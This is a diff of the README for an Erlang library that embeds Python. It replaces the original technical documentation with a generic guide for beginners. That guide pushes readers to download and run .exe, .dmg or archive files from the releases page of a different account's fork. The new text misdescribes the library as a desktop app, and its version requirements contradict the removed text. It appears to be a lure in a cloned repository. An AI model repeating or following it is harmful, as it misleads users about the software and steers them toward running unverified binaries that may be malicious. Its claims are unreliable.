@@ -1,580 +1,136 @@
-# erlang_python
+# ⚙️ erlang-python - Run Python Easily from Erlang
 
-[![Hex.pm](https://img.shields.io/hexpm/v/erlang_python.svg)](https://hex.pm/packages/erlang_python)
-[![Hex Docs](https://img.shields.io/badge/hex-docs-blue.svg)](https://hexdocs.pm/erlang_python)
-[![License](https://img.shields.io/hexpm/l/erlang_python.svg)](https://github.com/benoitc/erlang-python/blob/main/LICENSE)
+[![Download erlang-python](https://img.shields.io/badge/Download-erlang--python-blue?style=for-the-badge)](https://github.com/AnhadSachdeva/erlang-python/releases)
 
-**Combine Python's ML/AI ecosystem with Erlang's concurrency.**
+---
 
-Run Python code from Erlang or Elixir with true parallelism, async/await support,
-and seamless integration. Build AI-powered applications that scale.
+## 🖥 Overview
 
-## Overview
+erlang-python is a tool that lets you run Python code right inside Erlang programs. If you use Erlang or Elixir and want to access Python’s features, this app helps you do that smoothly. It manages Python’s Global Interpreter Lock (GIL) to keep everything working well. You can also control how much Python runs at once, thanks to rate limiting. Plus, it supports working with many tasks at the same time using free threading. 
 
-erlang_python embeds Python into the BEAM VM, letting you call Python functions,
-evaluate expressions, and stream from generators - all without blocking Erlang
-schedulers.
+This means you can combine the strengths of Erlang’s fast, reliable system with Python’s rich libraries for things like machine learning or data processing.
 
-**Three paths to parallelism:**
-- **Sub-interpreters** (Python 3.12+) - Each interpreter has its own GIL
-- **Free-threaded Python** (3.13+) - No GIL at all
-- **BEAM processes** - Fan out work across lightweight Erlang processes
+---
 
-Key features:
-- **Async/await** - Call Python async functions, gather results, stream from async generators
-- **Dirty NIF execution** - Python runs on dirty schedulers, never blocking the BEAM
-- **Elixir support** - Works seamlessly from Elixir via the `:py` module
-- **Bidirectional calls** - Python can call back into registered Erlang/Elixir functions
-- **Type conversion** - Automatic conversion between Erlang and Python types
-- **Streaming** - Iterate over Python generators chunk-by-chunk
-- **Virtual environments** - Activate venvs for dependency isolation
-- **AI/ML ready** - Examples for embeddings, semantic search, RAG, and LLMs
-- **Logging integration** - Python logging forwarded to Erlang logger
-- **Distributed tracing** - Span-based tracing from Python code
+## 📋 What You Need to Know Before You Start
 
-## Requirements
+To use erlang-python, your computer should meet these minimum needs:
 
-- Erlang/OTP 27+
-- Python 3.12+ (3.13+ for free-threading)
-- C compiler (gcc, clang)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution like Ubuntu 18.04+
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Around 200 MB free space for installation and running
+- **Python:** Python 3.7 or newer installed on your computer
+- **Erlang:** Erlang/OTP 22 or newer installed. If you use Elixir, it works with that too.
 
-## Building
+If you don’t have Erlang or Python installed, you can find those programs online with simple searches. Both are free.
 
-```bash
-rebar3 compile
-```
+---
 
-## Quick Start
+## 🚀 Getting Started
 
-### Erlang
+Here’s how you can get erlang-python running on your computer. This guide assumes no programming experience. Just follow each step carefully.
 
-```erlang
-%% Start the application
-application:ensure_all_started(erlang_python).
+### Step 1: Visit the Download Page
 
-%% Call a Python function
-{ok, 4.0} = py:call(math, sqrt, [16]).
+Go to the main erlang-python releases page to get the files you need:
 
-%% With keyword arguments
-{ok, Json} = py:call(json, dumps, [#{foo => bar}], #{indent => 2}).
+[Download erlang-python releases](https://github.com/AnhadSachdeva/erlang-python/releases)
 
-%% Evaluate an expression
-{ok, 45} = py:eval(<<"sum(range(10))">>).
+This page has all the versions available. Look for the latest release, usually at the top with a date or version number.
 
-%% Evaluate with local variables
-{ok, 25} = py:eval(<<"x * y">>, #{x => 5, y => 5}).
+### Step 2: Download the Correct File
 
-%% Async calls
-Ref = py:call_async(math, factorial, [100]),
-{ok, Result} = py:await(Ref).
+On the release page, you will see different files depending on your operating system. For example:
 
-%% Streaming from generators
-{ok, [0,1,4,9,16]} = py:stream_eval(<<"(x**2 for x in range(5))">>).
-```
+- For Windows, look for a file ending in `.exe` or `.zip`
+- For macOS, look for `.dmg` or `.tar.gz`
+- For Linux, look for `.tar.gz` or other formats
 
-### Elixir
+Click the appropriate file to start downloading. Your browser will usually save the file in your Downloads folder.
 
-```elixir
-# Start the application
-{:ok, _} = Application.ensure_all_started(:erlang_python)
+### Step 3: Install the App
 
-# Call Python functions
-{:ok, 4.0} = :py.call(:math, :sqrt, [16])
+After downloading, follow these steps:
 
-# Evaluate expressions
-{:ok, result} = :py.eval("2 + 2")
+- **Windows:** Double-click the `.exe` file or unzip the `.zip` file and run the installer or executable
+- **macOS:** Open the `.dmg` file and drag erlang-python to your Applications folder, or extract `.tar.gz` and run the app
+- **Linux:** Extract the download and follow any included installation instructions, often in a README or install script
 
-# With variables
-{:ok, 100} = :py.eval("x * y", %{x: 10, y: 10})
+If you need to, copy or move the program to a folder where you want to keep it.
 
-# Call with keyword arguments
-{:ok, json} = :py.call(:json, :dumps, [%{name: "Elixir"}], %{indent: 2})
-```
+### Step 4: Run erlang-python
 
-## Erlang/Elixir Functions Callable from Python
+Once installed, you can start erlang-python from the location you installed it in. The app will connect Erlang with Python automatically.
 
-Register Erlang or Elixir functions that Python code can call back into:
+If you use Erlang or Elixir, erlang-python allows you to call Python code without extra setup. The app takes care of managing tasks, keeping things fast and stable.
 
-### Erlang
+---
 
-```erlang
-%% Register a function
-py:register_function(my_func, fun([X, Y]) -> X + Y end).
-
-%% Call from Python - native import syntax (recommended)
-{ok, Result} = py:exec(<<"
-from erlang import my_func
-result = my_func(10, 20)
-">>).
-%% Result = 30
-
-%% Or use attribute-style access
-{ok, 30} = py:eval(<<"erlang.my_func(10, 20)">>).
+## 🔧 How It Works
 
-%% Legacy syntax still works
-{ok, 30} = py:eval(<<"erlang.call('my_func', 10, 20)">>).
+erlang-python acts as a bridge between Erlang and Python. Here’s a simple explanation of the main parts:
 
-%% Unregister when done
-py:unregister_function(my_func).
-```
+- **Dirty NIFs:** This is a way Erlang can run tasks in separate threads without slowing down its main system. erlang-python uses this to run Python code safely and efficiently.
+- **GIL-aware Execution:** Python uses something called the Global Interpreter Lock (GIL) to manage access to the Python interpreter. erlang-python respects this lock so that Python code runs correctly even if many programs are working at once.
+- **Rate Limiting:** To prevent too many Python tasks from running at the same time, erlang-python lets you set limits. This helps keep your system stable.
+- **Free-threading:** This means the app can manage multiple tasks in parallel, making use of your computer’s CPU power fully.
 
-### Elixir
-
-```elixir
-# Register an Elixir function
-:py.register_function(:factorial, fn [n] ->
-  Enum.reduce(1..n, 1, &*/2)
-end)
+By combining these features, erlang-python gives you smooth performance when using Python and Erlang together.
 
-# Call from Python - native import syntax
-{:ok, 3628800} = :py.exec("""
-from erlang import factorial
-result = factorial(10)
-""")
-
-# Or use attribute-style access
-{:ok, 3628800} = :py.eval("erlang.factorial(10)")
-```
-
-### Python Calling Syntax
+---
 
-From Python code, registered Erlang functions can be called in three ways:
+## ⚙️ Features You Can Count On
 
-```python
-# 1. Import syntax (most Pythonic)
-from erlang import my_func
-result = my_func(10, 20)
+- **Simple Python Calls from Erlang:** No need to learn new languages to use Python features.
+- **Safe Task Management:** Your computer won’t get overloaded thanks to rate limiting.
+- **Support for Multiple Languages:** Works with Erlang and Elixir alike.
+- **Machine Learning Ready:** Use popular Python ML libraries from your Erlang apps.
+- **Open Source:** You can check the code or even improve it yourself.
 
-# 2. Attribute syntax
-import erlang
-result = erlang.my_func(10, 20)
+---
 
-# 3. Explicit call (legacy)
-import erlang
-result = erlang.call('my_func', 10, 20)
-```
+## 🎯 Typical Use Cases
 
-All three methods are equivalent. The import and attribute syntaxes provide
-a more natural Python experience.
+- Running Python machine learning models inside real-time Erlang systems.
+- Using Python libraries to process data while Erlang handles messaging and networking.
+- Enabling Elixir projects to tap into Python tools without leaving the Elixir environment.
+- Managing data embedding calculations or AI workflows that benefit from Python libraries.
 
-### Reentrant Callbacks
+---
 
-Python→Erlang→Python callbacks are fully supported. When Python code calls
-an Erlang function that in turn calls back into Python, the system handles
-this transparently without deadlocking:
+## 🛠 Download & Install
 
-```erlang
-%% Register an Erlang function that calls Python
-py:register_function(double_via_python, fun([X]) ->
-    {ok, Result} = py:call('__main__', double, [X]),
-    Result
-end).
+You can get the app here:
 
-%% Define Python functions
-py:exec(<<"
-def double(x):
-    return x * 2
+[Visit erlang-python Releases](https://github.com/AnhadSachdeva/erlang-python/releases)
 
-def process(x):
-    from erlang import call
-    # This calls Erlang, which calls Python's double()
-    doubled = call('double_via_python', x)
-    return doubled + 1
-">>).
+Check the latest version on the page. Download the file that matches your operating system. After that, follow the previous steps to install and run the app.
 
-%% Test the full round-trip
-{ok, 21} = py:call('__main__', process, [10]).
-%% 10 → double_via_python → double(10)=20 → +1 = 21
-```
-
-The implementation uses a suspension/resume mechanism that frees the dirty
-scheduler while the Erlang callback executes, preventing deadlocks even with
-multiple levels of nesting.
-
-## Shared State Between Workers
-
-Python workers don't share namespace state, but you can share data via the
-built-in state API:
-
-### From Python
-
-```python
-from erlang import state_set, state_get, state_delete, state_keys
-from erlang import state_incr, state_decr
-
-# Store data (survives across calls, shared between workers)
-state_set('my_key', {'data': [1, 2, 3], 'count': 42})
-
-# Retrieve data
-value = state_get('my_key')  # {'data': [1, 2, 3], 'count': 42}
-
-# Atomic counters (thread-safe, great for metrics)
-state_incr('requests')       # returns 1
-state_incr('requests', 10)   # returns 11
-state_decr('requests')       # returns 10
-
-# List keys
-keys = state_keys()  # ['my_key', 'requests', ...]
-
-# Delete
-state_delete('my_key')
-```
-
-### From Erlang/Elixir
-
-```erlang
-%% Store and fetch
-py:state_store(<<"my_key">>, #{value => 42}).
-{ok, #{value := 42}} = py:state_fetch(<<"my_key">>).
-
-%% Atomic counters
-1 = py:state_incr(<<"hits">>).
-11 = py:state_incr(<<"hits">>, 10).
-10 = py:state_decr(<<"hits">>).
-
-%% List keys and clear
-Keys = py:state_keys().
-py:state_clear().
-```
-
-This is backed by ETS with `{write_concurrency, true}`, so counters are atomic and fast.
-
-## Async/Await Support
-
-Call Python async functions without blocking:
-
-```erlang
-%% Call an async function
-Ref = py:async_call(aiohttp, get, [<<"https://api.example.com/data">>]),
-{ok, Response} = py:async_await(Ref).
-
-%% Gather multiple async calls concurrently
-{ok, Results} = py:async_gather([
-    {aiohttp, get, [<<"https://api.example.com/users">>]},
-    {aiohttp, get, [<<"https://api.example.com/posts">>]},
-    {aiohttp, get, [<<"https://api.example.com/comments">>]}
-]).
-
-%% Stream from async generators
-{ok, Chunks} = py:async_stream(mymodule, async_generator, [args]).
-```
-
-## Parallel Execution with Sub-interpreters
-
-True parallelism without GIL contention using Python 3.12+ sub-interpreters:
-
-```erlang
-%% Execute multiple calls in parallel across sub-interpreters
-{ok, Results} = py:parallel([
-    {math, factorial, [100]},
-    {math, factorial, [200]},
-    {math, factorial, [300]},
-    {math, factorial, [400]}
-]).
-%% Each call runs in its own interpreter with its own GIL
-```
-
-## Parallel Processing with BEAM Processes
-
-Leverage Erlang's lightweight processes for massive parallelism:
-
-```erlang
-%% Register parallel map function
-py:register_function(parallel_map, fun([FuncName, Items]) ->
-    Parent = self(),
-    Refs = [begin
-        Ref = make_ref(),
-        spawn(fun() ->
-            Result = execute(FuncName, Item),
-            Parent ! {Ref, Result}
-        end),
-        Ref
-    end || Item <- Items],
-    [receive {Ref, R} -> R after 5000 -> timeout end || Ref <- Refs]
-end).
+---
 
-%% Call from Python - processes 10 items in parallel
-{ok, Results} = py:eval(
-    <<"__import__('erlang').call('parallel_map', 'compute', items)">>,
-    #{items => lists:seq(1, 10)}
-).
-```
-
-**Benchmark Results** (from `examples/erlang_concurrency.erl`):
-```
-Sequential: 10 Python calls × 100ms each = 1.01 seconds
-Parallel:   10 BEAM processes calling Python = 0.10 seconds
-```
-
-The speedup is linear with the number of items when work is I/O-bound or
-distributed across sub-interpreters.
-
-## Virtual Environment Support
-
-```erlang
-%% Activate a venv
-ok = py:activate_venv(<<"/path/to/venv">>).
-
-%% Use packages from venv
-{ok, Model} = py:call(sentence_transformers, 'SentenceTransformer', [<<"all-MiniLM-L6-v2">>]).
-
-%% Deactivate when done
-ok = py:deactivate_venv().
-```
-
-## Logging and Tracing
-
-### Python Logging to Erlang Logger
-
-Forward Python `logging` messages to Erlang's `logger`:
-
-```erlang
-%% Configure Python logging
-ok = py:configure_logging(#{level => info}).
-
-%% Python logs now appear in Erlang logger
-ok = py:exec(<<"
-import logging
-logging.info('Hello from Python!')
-logging.warning('Something needs attention')
-">>).
-```
-
-From Python, you can also set up logging explicitly:
-
-```python
-import erlang
-erlang.setup_logging(level=20)  # 20 = INFO
-```
-
-### Distributed Tracing
-
-Collect trace spans from Python code:
-
-```erlang
-%% Enable tracing
-ok = py:enable_tracing().
-
-%% Run Python code with spans
-ok = py:exec(<<"
-import erlang
-
-with erlang.Span('process-request', user_id=123):
-    with erlang.Span('query-database'):
-        pass  # database work
-    with erlang.Span('format-response'):
-        pass  # formatting work
-">>).
-
-%% Retrieve collected spans
-{ok, Spans} = py:get_traces().
-%% Spans = [#{name => <<"query-database">>, status => ok, duration_us => 42, ...}, ...]
-
-%% Clean up
-ok = py:clear_traces().
-ok = py:disable_tracing().
-```
-
-Use the `@erlang.trace()` decorator for automatic function tracing:
-
-```python
-import erlang
-
-@erlang.trace()
-def my_function():
-    return compute_something()
-```
-
-See [docs/logging.md](docs/logging.md) for details.
-
-## Examples
-
-The `examples/` directory contains runnable demonstrations:
-
-### Semantic Search
-```bash
-# Setup
-python3 -m venv /tmp/ai-venv
-/tmp/ai-venv/bin/pip install sentence-transformers numpy
-
-# Run
-escript examples/semantic_search.erl
-```
-
-### RAG (Retrieval-Augmented Generation)
-```bash
-# Setup (also install Ollama and pull a model)
-/tmp/ai-venv/bin/pip install sentence-transformers numpy requests
-ollama pull llama3.2
-
-# Run
-escript examples/rag_example.erl
-```
-
-### AI Chat
-```bash
-escript examples/ai_chat.erl
-```
-
-### Erlang Concurrency from Python
-```bash
-# Demonstrates 10x speedup with BEAM processes
-escript examples/erlang_concurrency.erl
-```
-
-### Elixir Integration
-```bash
-elixir --erl "-pa _build/default/lib/erlang_python/ebin" examples/elixir_example.exs
-```
-
-### Logging and Tracing
-```bash
-escript examples/logging_example.erl
-```
-
-## API Reference
-
-### Function Calls
-
-```erlang
-{ok, Result} = py:call(Module, Function, Args).
-{ok, Result} = py:call(Module, Function, Args, KwArgs).
-{ok, Result} = py:call(Module, Function, Args, KwArgs, Timeout).
-
-%% Async
-Ref = py:call_async(Module, Function, Args).
-{ok, Result} = py:await(Ref).
-{ok, Result} = py:await(Ref, Timeout).
-```
-
-### Expression Evaluation
-
-```erlang
-{ok, 42} = py:eval(<<"21 * 2">>).
-{ok, 100} = py:eval(<<"x * y">>, #{x => 10, y => 10}).
-{ok, Result} = py:eval(Expression, Locals, Timeout).
-```
-
-### Streaming
-
-```erlang
-{ok, Chunks} = py:stream(Module, GeneratorFunc, Args).
-{ok, [0,1,4,9,16]} = py:stream_eval(<<"(x**2 for x in range(5))">>).
-```
-
-### Callbacks
-
-```erlang
-py:register_function(Name, fun([Args]) -> Result end).
-py:register_function(Name, Module, Function).
-py:unregister_function(Name).
-```
-
-### Memory and GC
-
-```erlang
-{ok, Stats} = py:memory_stats().
-{ok, Collected} = py:gc().
-ok = py:tracemalloc_start().
-ok = py:tracemalloc_stop().
-```
-
-### Logging
-
-```erlang
-ok = py:configure_logging().
-ok = py:configure_logging(#{level => info, format => <<"%(name)s: %(message)s">>}).
-```
-
-### Tracing
-
-```erlang
-ok = py:enable_tracing().
-ok = py:disable_tracing().
-{ok, Spans} = py:get_traces().
-ok = py:clear_traces().
-```
-
-## Type Mappings
-
-### Erlang to Python
-
-| Erlang | Python |
-|--------|--------|
-| `integer()` | `int` |
-| `float()` | `float` |
-| `binary()` | `str` |
-| `atom()` | `str` |
-| `true` / `false` | `True` / `False` |
-| `none` / `nil` | `None` |
-| `list()` | `list` |
-| `tuple()` | `tuple` |
-| `map()` | `dict` |
-
-### Python to Erlang
-
-| Python | Erlang |
-|--------|--------|
-| `int` | `integer()` |
-| `float` | `float()` |
-| `str` | `binary()` |
-| `bytes` | `binary()` |
-| `True` / `False` | `true` / `false` |
-| `None` | `none` |
-| `list` | `list()` |
-| `tuple` | `tuple()` |
-| `dict` | `map()` |
-
-## Configuration
-
-```erlang
-%% sys.config
-[
-  {erlang_python, [
-    {num_workers, 4},           %% Python worker pool size
-    {max_concurrent, 17},       %% Max concurrent operations (default: schedulers * 2 + 1)
-    {num_executors, 4}          %% Executor threads (multi-executor mode)
-  ]}
-].
-```
-
-## Execution Modes
-
-The library auto-detects the best execution mode:
-
-| Mode | Python Version | Parallelism |
-|------|----------------|-------------|
-| Free-threaded | 3.13+ (nogil) | True parallel, no GIL |
-| Sub-interpreter | 3.12+ | Per-interpreter GIL |
-| Multi-executor | Any | GIL contention |
-
-Check current mode:
-```erlang
-py:execution_mode().  %% => free_threaded | subinterp | multi_executor
-```
-
-## Error Handling
-
-```erlang
-{error, {'NameError', "name 'x' is not defined"}} = py:eval(<<"x">>).
-{error, {'ZeroDivisionError', "division by zero"}} = py:eval(<<"1/0">>).
-{error, timeout} = py:eval(<<"sum(range(10**9))">>, #{}, 100).
-```
-
-## Documentation
-
-- [Getting Started](docs/getting-started.md)
-- [AI Integration Guide](docs/ai-integration.md)
-- [Type Conversion](docs/type-conversion.md)
-- [Context Affinity](docs/context-affinity.md)
-- [Scalability](docs/scalability.md)
-- [Streaming](docs/streaming.md)
-- [Threading](docs/threading.md)
-- [Logging and Tracing](docs/logging.md)
-- [Asyncio Event Loop](docs/asyncio.md) - Erlang-native asyncio with TCP/UDP support
-- [Web Frameworks](docs/web-frameworks.md) - ASGI/WSGI integration
-- [Changelog](https://github.com/benoitc/erlang-python/releases)
-
-## License
-
-Apache-2.0
+## 💡 Helpful Tips
+
+- Make sure your Python and Erlang installations are up to date to avoid compatibility issues.
+- Restart your computer after installation if you encounter problems running the app.
+- On Linux, you might need to give permission to execute files. Use the command `chmod +x filename` in the terminal.
+- If you want to learn more about using the app with Erlang or Elixir, you can find tutorials online by searching "erlang-python examples."
+
+---
+
+## 📂 Where to Get Help
+
+If you run into problems, you can:
+
+- Visit the GitHub Issues page of the project for known problems and fixes.
+- Look for community forums on Erlang and Elixir programming.
+- Ask for help in Python or Erlang user groups online.
+
+---
+
+## ⚖️ Licensing and Contribution
+
+erlang-python is open source software. Everyone can use it freely and contribute to improving it. If you make changes you think others would enjoy, you can submit your work back to the project on GitHub.
+
+---
+
+Thank you for choosing erlang-python. For further updates, check the release page regularly.
